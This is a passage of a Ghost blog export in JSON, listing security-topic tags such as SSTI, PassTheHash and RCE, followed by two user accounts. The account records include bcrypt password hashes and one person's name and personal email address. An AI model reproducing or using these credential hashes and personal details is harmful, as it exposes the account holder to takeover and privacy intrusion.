            "updated_at": "2022-02-08T20:22:21.000Z"
          },
          {
            "id": "63a223c00057530148112361",
            "name": "Windows",
            "slug": "windows",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-11T23:46:37.000Z",
            "updated_at": "2022-02-11T23:46:37.000Z"
          },
          {
            "id": "63a223c00057530148112362",
            "name": "ServerOperatorGroupAbusing",
            "slug": "serveroperatorgroupabusing",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-11T23:46:37.000Z",
            "updated_at": "2022-02-11T23:46:37.000Z"
          },
          {
            "id": "63a223c00057530148112363",
            "name": "ServiceConfigurationManipulation",
            "slug": "serviceconfigurationmanipulation",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-11T23:46:37.000Z",
            "updated_at": "2022-02-11T23:46:37.000Z"
          },
          {
            "id": "63a223c00057530148112364",
            "name": "SSTI",
            "slug": "ssti",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-12T09:16:45.000Z",
            "updated_at": "2022-02-12T09:16:45.000Z"
          },
          {
            "id": "63a223c00057530148112365",
            "name": "PassTheHash",
            "slug": "passthehash",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-13T19:48:14.000Z",
            "updated_at": "2022-02-13T19:48:14.000Z"
          },
          {
            "id": "63a223c00057530148112366",
            "name": "Docker",
            "slug": "docker",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-13T20:02:03.000Z",
            "updated_at": "2022-02-13T20:02:03.000Z"
          },
          {
            "id": "63a223c00057530148112367",
            "name": "AWS",
            "slug": "aws",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:27:26.000Z",
            "updated_at": "2022-02-17T05:27:26.000Z"
          },
          {
            "id": "63a223c00057530148112368",
            "name": "Lambda",
            "slug": "lambda",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:27:26.000Z",
            "updated_at": "2022-02-17T05:27:26.000Z"
          },
          {
            "id": "63a223c00057530148112369",
            "name": "Tar",
            "slug": "tar",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:27:26.000Z",
            "updated_at": "2022-02-17T05:27:26.000Z"
          },
          {
            "id": "63a223c0005753014811236a",
            "name": "VueJS",
            "slug": "vuejs",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:32:58.000Z",
            "updated_at": "2022-02-17T05:32:58.000Z"
          },
          {
            "id": "63a223c0005753014811236b",
            "name": "Fuzzing",
            "slug": "fuzzing",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:32:58.000Z",
            "updated_at": "2022-02-17T05:32:58.000Z"
          },
          {
            "id": "63a223c0005753014811236c",
            "name": "Rce",
            "slug": "rce",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-17T05:32:58.000Z",
            "updated_at": "2022-02-17T05:32:58.000Z"
          },
          {
            "id": "63a223c0005753014811236d",
            "name": "Blog",
            "slug": "blog",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-02-27T15:23:02.000Z",
            "updated_at": "2022-02-27T15:23:02.000Z"
          },
          {
            "id": "63a223c0005753014811236e",
            "name": "#Import 2022-12-20 21:06",
            "slug": "hash-import-2022-12-20-21-06",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "internal",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-20T21:06:08.000Z",
            "updated_at": "2022-12-20T21:06:08.000Z"
          },
          {
            "id": "63ae0877010597005b7a294d",
            "name": "Suid",
            "slug": "suid",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T21:36:55.000Z",
            "updated_at": "2022-12-29T21:36:55.000Z"
          },
          {
            "id": "63ae0877010597005b7a294e",
            "name": "Dstat",
            "slug": "dstat",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T21:36:55.000Z",
            "updated_at": "2022-12-29T21:36:55.000Z"
          },
          {
            "id": "63ae0877010597005b7a294f",
            "name": "Doas",
            "slug": "doas",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T21:36:55.000Z",
            "updated_at": "2022-12-29T21:36:55.000Z"
          },
          {
            "id": "63ae0877010597005b7a2950",
            "name": "Websockets",
            "slug": "websockets",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T21:36:55.000Z",
            "updated_at": "2022-12-29T21:36:55.000Z"
          },
          {
            "id": "63ae08e5010597005b7a295c",
            "name": "Pivoting",
            "slug": "pivoting",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T21:38:45.000Z",
            "updated_at": "2022-12-29T21:38:45.000Z"
          },
          {
            "id": "63ae14bf010597005b7a29ce",
            "name": "Osint",
            "slug": "osint",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T22:29:19.000Z",
            "updated_at": "2022-12-29T22:29:19.000Z"
          },
          {
            "id": "63ae14bf010597005b7a29cf",
            "name": "WiFi",
            "slug": "wifi",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-29T22:29:19.000Z",
            "updated_at": "2022-12-29T22:29:19.000Z"
          },
          {
            "id": "63af3090fef629005bc8cf11",
            "name": "Snmp",
            "slug": "snmp",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-30T18:40:16.000Z",
            "updated_at": "2022-12-30T18:40:16.000Z"
          },
          {
            "id": "63af6cc5fef629005bc8d0b1",
            "name": "Enumeration",
            "slug": "enumeration",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2022-12-30T22:57:09.000Z",
            "updated_at": "2022-12-30T22:57:09.000Z"
          },
          {
            "id": "63b1dfb4fae523005bfcee32",
            "name": "Grafana",
            "slug": "grafana",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-01T19:32:04.000Z",
            "updated_at": "2023-01-01T19:32:04.000Z"
          },
          {
            "id": "63b1dfb4fae523005bfcee33",
            "name": "Git",
            "slug": "git",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-01T19:32:04.000Z",
            "updated_at": "2023-01-01T19:32:04.000Z"
          },
          {
            "id": "63b1dfb4fae523005bfcee34",
            "name": "Lfi",
            "slug": "lfi",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-01T19:32:04.000Z",
            "updated_at": "2023-01-01T19:32:04.000Z"
          },
          {
            "id": "63b1dfb4fae523005bfcee35",
            "name": "Directory Path Traversal",
            "slug": "directory-path-traversal",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-01T19:32:04.000Z",
            "updated_at": "2023-01-01T19:32:04.000Z"
          },
          {
            "id": "63b5e3f82d7f8e0065b35d8e",
            "name": "DNS Spoofing",
            "slug": "dns-spoofing",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-04T20:39:20.000Z",
            "updated_at": "2023-01-04T20:39:20.000Z"
          },
          {
            "id": "63b5e3f82d7f8e0065b35d8f",
            "name": "POC",
            "slug": "poc",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-01-04T20:39:20.000Z",
            "updated_at": "2023-01-04T20:39:20.000Z"
          },
          {
            "id": "64cb77c93a1966005b7371d7",
            "name": "retrogasteiz",
            "slug": "retrogasteiz",
            "description": null,
            "feature_image": null,
            "parent_id": null,
            "visibility": "public",
            "og_image": null,
            "og_title": null,
            "og_description": null,
            "twitter_image": null,
            "twitter_title": null,
            "twitter_description": null,
            "meta_title": null,
            "meta_description": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "canonical_url": null,
            "accent_color": null,
            "created_at": "2023-08-03T09:47:53.000Z",
            "updated_at": "2023-08-03T09:47:53.000Z"
          }
        ],
        "users": [
          {
            "id": "1",
            "name": "user",
            "slug": "user",
            "password": "$2a$10$Tj5Ng.dP0xloESQ0DlRk1ezQPhFg4ioWkHakZnKXxHiyPmsd/2Bhu",
            "email": "user@example.com",
            "profile_image": null,
            "cover_image": null,
            "bio": null,
            "website": null,
            "location": null,
            "facebook": null,
            "twitter": null,
            "accessibility": "{\"whatsNew\":{\"lastSeenDate\":\"2022-12-14T14:14:59.000+00:00\"}}",
            "status": "active",
            "locale": null,
            "visibility": "public",
            "meta_title": null,
            "meta_description": null,
            "tour": null,
            "last_seen": "2022-12-20T21:05:42.000Z",
            "comment_notifications": 1,
            "free_member_signup_notification": 1,
            "paid_subscription_started_notification": 1,
            "paid_subscription_canceled_notification": 0,
            "created_at": "2022-12-20T21:04:26.000Z",
            "updated_at": "2022-12-20T21:09:40.000Z"
          },
          {
            "id": "63a223c0005753014811234d",
            "name": "Iker Ocio Zuazo",
            "slug": "iocio",
            "password": "$2a$10$tMvRkfn6SdNRWFoCm4Mt/O4tJIzVVpfOL/SpVIOZ72kUx2ZLbk7tK",
            "email": "ikerocio@yahoo.es",
            "profile_image": "__GHOST_URL__/content/images/2022/01/Screenshot_7.png",
            "cover_image": "__GHOST_URL__/content/images/2022/01/google-ctf-banner-1.jpg",
            "bio": null,
            "website": "https://ikerocio.com",
            "location": "World Wide Web",
            "facebook": null,
            "twitter": null,
            "accessibility": "{\"nightShift\":false,\"whatsNew\":{\"lastSeenDate\":\"2021-12-17T15:25:10.000+00:00\"}}",
            "status": "active",
            "locale": null,
            "visibility": "public",
            "meta_title": null,
            "meta_description": null,
            "tour": null,
            "last_seen": "2023-11-10T22:54:40.000Z",
            "comment_notifications": 1,
            "free_member_signup_notification": 1,
            "paid_subscription_started_notification": 1,
            "paid_subscription_canceled_notification": 0,
            "created_at": "2022-01-29T15:07:05.000Z",
            "updated_at": "2023-11-10T22:54:40.000Z"
          }
        ]
      }
    }
  ]
}
